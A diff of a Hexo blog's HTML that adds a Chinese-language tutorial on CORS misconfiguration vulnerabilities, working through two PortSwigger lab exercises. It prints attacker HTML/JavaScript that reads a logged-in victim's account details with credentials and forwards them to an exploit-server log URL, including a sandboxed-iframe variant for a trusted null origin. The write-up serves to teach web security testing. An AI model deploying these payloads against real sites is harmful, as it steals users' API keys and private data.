@@ -6,17 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives | 佘雅晴のblog</title>
+  <title>CORS | 佘雅晴のblog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="佘雅晴のblog">
-<meta property="og:url" content="http://example.com/archives/index.html">
+  <meta name="description" content="CORS(跨域资源共享漏洞)原理当一个网页发起跨域请求（例如 fetch() 或 XMLHttpRequest）时，浏览器会向目标服务器发送一个 Origin 头。 如果目标服务器响应中包含 Access-Control-Allow-Origin 且值匹配原始页面的源，浏览器就允许前端访问响应数据；否则被阻止。 例： 123456&#x2F;&#x2F; 请求头Origin: https:&#x2F;&#x2F;evil.com&#x2F;&#x2F; 响">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CORS">
+<meta property="og:url" content="http://example.com/2025/07/12/cors/index.html">
 <meta property="og:site_name" content="佘雅晴のblog">
+<meta property="og:description" content="CORS(跨域资源共享漏洞)原理当一个网页发起跨域请求（例如 fetch() 或 XMLHttpRequest）时，浏览器会向目标服务器发送一个 Origin 头。 如果目标服务器响应中包含 Access-Control-Allow-Origin 且值匹配原始页面的源，浏览器就允许前端访问响应数据；否则被阻止。 例： 123456&#x2F;&#x2F; 请求头Origin: https:&#x2F;&#x2F;evil.com&#x2F;&#x2F; 响">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/pic/6.png">
+<meta property="og:image" content="http://example.com/pic/7.png">
+<meta property="article:published_time" content="2025-07-12T09:46:28.000Z">
+<meta property="article:modified_time" content="2025-07-13T03:59:52.928Z">
 <meta property="article:author" content="snake&#39;blog">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/pic/6.png">
   
     <link rel="alternative" href="/atom.xml" title="佘雅晴のblog" type="application/atom+xml">
   
@@ -207,346 +214,268 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-cors" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2025" class="archive-year">2025</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+    <h1 class="article-title" itemprop="name">
+      CORS
+    </h1>
+  
+
+
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
 <a href="/2025/07/12/cors/" class="archive-article-date">
         <time datetime="2025-07-12T09:46:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-07-12</time>
 </a>
 
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.1k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">4分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="CORS-跨域资源共享漏洞"><a href="#CORS-跨域资源共享漏洞" class="headerlink" title="CORS(跨域资源共享漏洞)"></a>CORS(跨域资源共享漏洞)</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当一个网页发起跨域请求（例如 <code>fetch()</code> 或 <code>XMLHttpRequest</code>）时，浏览器会向目标服务器发送一个 <code>Origin</code> 头。</p>
+<p>如果目标服务器响应中包含 <code>Access-Control-Allow-Origin</code> 且值匹配原始页面的源，浏览器就允许前端访问响应数据；否则被阻止。</p>
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 请求头</span><br><span class="line">Origin: https://evil.com</span><br><span class="line"></span><br><span class="line">// 响应头</span><br><span class="line">Access-Control-Allow-Origin: https://evil.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>CORS 漏洞的核心在于<strong>服务器错误地信任了不应信任的 Origin</strong>，从而导致敏感信息泄露或权限操作被越权。</p>
+<h3 id="常见成因"><a href="#常见成因" class="headerlink" title="常见成因"></a>常见成因</h3><h5 id="1-任意Origin允许"><a href="#1-任意Origin允许" class="headerlink" title="1.任意Origin允许"></a>1.任意Origin允许</h5><p>有一个接口返回<code>Access-Control-Allow-Origin: *</code>但返回的是敏感信息(如用户信息，token等)</p>
+<h5 id="2-搭配Access-Control-Allow-Credentials-true泄露Cookie"><a href="#2-搭配Access-Control-Allow-Credentials-true泄露Cookie" class="headerlink" title="2.搭配Access-Control-Allow-Credentials: true泄露Cookie"></a>2.搭配<code>Access-Control-Allow-Credentials: true</code>泄露Cookie</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: https://evil.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
+
+<p>这表示服务器允许携带 cookie 的跨域请求，<strong>一旦 Origin 是攻击者控制的域名，就可能借助受害者的 cookie 获取其权限下的敏感数据。</strong></p>
+<h3 id="靶场练习https-portswigger-net-web-security-cors"><a href="#靶场练习https-portswigger-net-web-security-cors" class="headerlink" title="靶场练习https://portswigger.net/web-security/cors"></a>靶场练习<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a></h3><h4 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h4><ol>
+<li><p>打开靶场，有初始账号密码是wiener：peter，开bp，登录我的账户页面</p>
+</li>
+<li><p>查看历史记录，观察到密钥是通过AJAX请求检索的(?,</p>
+<p>并且响应包含<code>/accountDetails   Access-Control-Allow-Credentials</code>表明存在cors漏洞</p>
+<p><img src="/pic/6.png" alt="图片"></p>
+</li>
+<li><p>发到repeater，添加请求头<code>Origin: https://example.com</code>查看响应头出现源<code>Access-Control-Allow-Origin</code></p>
+</li>
+<li><p>确认cors漏洞，转到攻击者，输入以下THML（注意替换YOUR-LAB-ID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var req = new XMLHttpRequest();</span><br><span class="line">    req.onload = reqListener;</span><br><span class="line">    req.open(&#x27;get&#x27;,&#x27;YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true);</span><br><span class="line">    req.withCredentials = true;</span><br><span class="line">    req.send();</span><br><span class="line"></span><br><span class="line">    function reqListener() &#123;</span><br><span class="line">        location=&#x27;/log?key=&#x27;+this.responseText;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>发送给被攻击者，查看登录日志</p>
+<p>找到被攻击者的API密钥以及其他信息</p>
+<p><img src="/pic/7.png" alt="图片"></p>
+</li>
+</ol>
+<h4 id="例2：具有可信-null-源的-CORS-漏洞"><a href="#例2：具有可信-null-源的-CORS-漏洞" class="headerlink" title="例2：具有可信 null 源的 CORS 漏洞"></a>例2：具有可信 null 源的 CORS 漏洞</h4><ol>
+<li><p>攻击方THML</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&lt;script&gt;</span><br><span class="line">    var req = new XMLHttpRequest();</span><br><span class="line">    req.onload = reqListener;</span><br><span class="line">    req.open(&#x27;get&#x27;,&#x27;YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true);</span><br><span class="line">    req.withCredentials = true;</span><br><span class="line">    req.send();</span><br><span class="line">    function reqListener() &#123;</span><br><span class="line">        location=&#x27;YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=&#x27;+encodeURIComponent(this.responseText);</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>iframe sandbox</code>沙箱绕过技术</li>
+<li><code>srcdoc</code>属性注入<code>Javascript</code>脚本</li>
+<li><code>XMLHttpRequset</code>进行跨域请求读取敏感信息</li>
+<li>利用 <code>withCredentials</code> 携带 Cookie</li>
+<li>然后将响应通过 <code>location</code> 重定向的方式发送到攻击者控制的服务器（用于<strong>窃取数据</strong>）</li>
+</ul>
+</li>
+</ol>
+<h5 id="🔲"><a href="#🔲" class="headerlink" title="🔲 &lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; ... &gt;"></a>🔲 <code>&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; ... &gt;</code></h5><p>这个 <code>iframe </code>被设置了 <code>sandbox</code> 属性，但保留了以下三个权限：</p>
+<ul>
+<li><code>allow-scripts</code>：允许 <code>&lt;script&gt;</code> 执行（核心）</li>
+<li><code>allow-top-navigation</code>：允许通过 <code>location = &#39;...&#39;</code> 方式导航顶层页面（用来“带出”窃取的数据）</li>
+<li><code>allow-forms</code>：允许提交表单（可选，不影响这段代码）</li>
+</ul>
+<p>⚠️ 这是一种 <strong>沙箱内脚本仍可发送请求 + 重定向的最小权限配置组合</strong>。</p>
+<p><code>srcdoc</code> 是一个 <code>iframe</code> 的属性，允许我们直接把 HTML 写入 <code>iframe</code> 内容中。<strong>这里我们直接将 JavaScript 注入进去执行</strong>。</p>
+<h3 id="插播"><a href="#插播" class="headerlink" title="插播&lt;iframe&gt;:"></a>插播<code>&lt;iframe&gt;</code>:</h3><p><code>&lt;iframe&gt;</code>（<code>Inline Frame</code>，内联框架）用于在一个 HTML 页面中嵌入另一个 HTML 页面，相当于在主页面中开了一个“窗口”。</p>
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://example.com&quot; width=&quot;600&quot; height=&quot;400&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">表示在当前页面嵌入一个 600x400 的窗口，显示 example.com 页面内容。</span><br></pre></td></tr></table></figure>
+
+<h4 id="重要属性："><a href="#重要属性：" class="headerlink" title="重要属性："></a>重要属性：</h4><ol>
+<li><p>src</p>
+<p>要加载的页面地址</p>
+</li>
+<li><p><strong>sandbox</strong></p>
+<p>用于<strong>限制 iframe 的行为权限</strong>，可以防止 iframe 执行脚本、提交表单、发起导航等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例：&lt;iframe sandbox src=&quot;evil.html&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p>默认下列权限全禁用，<strong>要开启必须显式声明</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>属性值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>allow-scripts</code></td>
+<td>允许执行 JavaScript</td>
+</tr>
+<tr>
+<td><code>allow-forms</code></td>
+<td>允许提交表单</td>
+</tr>
+<tr>
+<td><code>allow-same-origin</code></td>
+<td>允许被加载页面保持其原本的源（否则视为“匿名”源）</td>
+</tr>
+<tr>
+<td><code>allow-top-navigation</code></td>
+<td>允许 <code>iframe</code> 修改顶层页面的地址</td>
+</tr>
+<tr>
+<td><code>allow-popups</code></td>
+<td>允许弹出新窗口（<code>window.open</code>）</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例：&lt;iframe sandbox=&quot;allow-scripts allow-forms&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">仅允许执行 JS 和表单提交，但仍不能访问 Cookie、本地存储，也不能访问主页面的 DOM。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>srcdoc</p>
+<p>允许你<strong>直接将 HTML 代码嵌入 iframe 中</strong>，而不是从 URL 加载页面。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;h1&gt;Hello iframe&lt;/h1&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">配合 sandbox 可以用来嵌入受限的脚本或攻击代码（如 CTF 中跨域窃取用法）。</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/07/12/cors/" target="_blank">CORS</a>
-  
-    </h1>
-  
+      </div>
+    </span>
+  </div>
+</div>
 
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2025/07/12/cors/" alt="微信分享二维码"> -->
+    </div>
+</div>
 
-        <div class="article-info info-on-right">
-          
-          
+<div class="mask js-mask"></div>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/07/10/csrf/" class="archive-article-date">
-        <time datetime="2025-07-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-07-10</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2025/07/10/csrf/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">csrf</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/07/10/csrf/" target="_blank">csrf</a>
-  
-    </h1>
-  
+        
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/05/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="archive-article-date">
-        <time datetime="2025-05-01T10:10:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-05-01</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/05/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">文件包含</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/04/26/ssti/" class="archive-article-date">
-        <time datetime="2025-04-26T04:59:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-26</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/04/26/ssti/" target="_blank">ssti</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/04/11/RCE/" class="archive-article-date">
-        <time datetime="2025-04-11T08:42:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-11</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/04/11/RCE/" target="_blank">RCE</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/04/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" class="archive-article-date">
-        <time datetime="2025-04-07T15:27:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-07</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/04/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" target="_blank">SSRF服务器端请求伪造</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-        <time datetime="2025-02-12T15:27:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-12</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/02/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" target="_blank">文件上传漏洞一些wp</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/08/php/" class="archive-article-date">
-        <time datetime="2025-02-08T04:30:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-08</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/02/08/php/" target="_blank">php</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/01/25/SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-        <time datetime="2025-01-25T09:50:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-01-25</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/01/25/SQL%E6%B3%A8%E5%85%A5/" target="_blank">SQL注入</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/01/24/xss/" class="archive-article-date">
-        <time datetime="2025-01-24T14:14:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-01-24</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/01/24/xss/" target="_blank">xss</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
-  
 
 
           </div>
@@ -587,8 +516,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
